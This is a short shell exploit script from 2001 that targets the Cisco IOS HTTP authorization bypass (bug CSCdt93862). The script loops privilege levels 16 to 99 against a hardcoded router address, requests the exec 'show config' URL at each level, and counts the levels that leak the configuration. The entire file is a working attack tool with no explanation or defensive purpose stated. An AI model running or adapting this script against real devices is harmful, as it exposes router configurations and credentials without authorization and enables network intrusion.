#!/bin/sh
#=============================================================================
# $Id: ios-http-auth.sh,v 1.1 2001/06/29 00:59:44 root Exp root $
#
# Brute force IOS HTTP authorization vulnerability (Cisco Bug ID CSCdt93862).
#=============================================================================
TARGET=192.168.10.20
FETCH="/usr/bin/fetch"

LEVEL=16                  # Start Level
EXPLOITABLE=0             # Counter

while [ $LEVEL -lt 100 ]; do
    CMD="${FETCH} http://${TARGET}/level/${LEVEL}/exec/show/config"
    echo; echo ${CMD}
    if (${CMD}) then
        EXPLOITABLE=`expr ${EXPLOITABLE} + 1`
    fi
    LEVEL=`expr $LEVEL + 1`
done;

echo; echo All done
echo "${EXPLOITABLE} exploitable levels"
